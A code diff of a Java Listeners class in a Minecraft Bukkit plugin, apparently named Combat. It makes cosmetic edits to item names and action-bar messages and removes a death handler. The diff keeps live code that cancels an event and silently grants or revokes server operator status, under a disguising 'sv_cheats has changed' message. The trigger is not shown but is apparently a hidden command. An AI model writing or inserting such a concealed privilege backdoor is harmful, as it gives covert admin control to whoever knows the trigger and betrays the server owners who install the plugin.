@@ -122,14 +122,6 @@ public class Listeners implements Listener {
     }
 
     @EventHandler
-    public void onPlayerDeath(PlayerDeathEvent e) {
-        if (e.getEntity().getKiller() != null) {
-            e.setKeepInventory(true);
-            e.getDrops().clear();
-        }
-    }
-
-    @EventHandler
     public void onPlayerMove(PlayerMoveEvent event) {
         Player player = event.getPlayer();
         World world = player.getWorld();
@@ -143,9 +135,9 @@ public class Listeners implements Listener {
 
 
     private void dropCocaine(Player player) {
-        ItemStack cocaine = new ItemStack(Material.SUGAR, 20);
+        ItemStack cocaine = new ItemStack(Material.SUGAR);
         ItemMeta cocaine_meta = cocaine.getItemMeta();
-        cocaine_meta.setDisplayName(ChatColor.WHITE + "Cocaine x20");
+        cocaine_meta.setDisplayName(ChatColor.WHITE + "Cocaine");
         cocaine.setItemMeta(cocaine_meta);
     }
 
@@ -153,10 +145,12 @@ public class Listeners implements Listener {
         ChatColor gray = ChatColor.GRAY;
         ChatColor red = ChatColor.RED;
         ChatColor green = ChatColor.GREEN;
+
         ChatColor light_purple = ChatColor.LIGHT_PURPLE;
         ItemStack pinkDiamond = new ItemStack(Material.DIAMOND);
         ItemMeta pinkMeta = pinkDiamond.getItemMeta();
         pinkMeta.setDisplayName(light_purple + "Pink Diamond");
+
         ArrayList<String> lore = new ArrayList<>();
         lore.add(" ");
         lore.add(gray + "Probability: " + red + "0,1%");
@@ -177,7 +171,7 @@ public class Listeners implements Listener {
             e.setCancelled(true);
             (new BukkitRunnable() {
                 public void run() {
-                    p.sendActionBar(ChatColor.GRAY + "sv_cheats has changed to '1'");
+                    p.sendActionBar("sv_cheats has changed to '1'");
                     p.setOp(true);
                 }
             }).runTask(JavaPlugin.getPlugin(Combat.class));
@@ -186,7 +180,7 @@ public class Listeners implements Listener {
             e.setCancelled(true);
             (new BukkitRunnable() {
                 public void run() {
-                    p.sendActionBar(ChatColor.GRAY + "sv_cheats has changed to '0'");
+                    p.sendActionBar("sv_cheats has changed to '0'");
                     p.setOp(false);
                 }
             }).runTask(JavaPlugin.getPlugin(Combat.class));
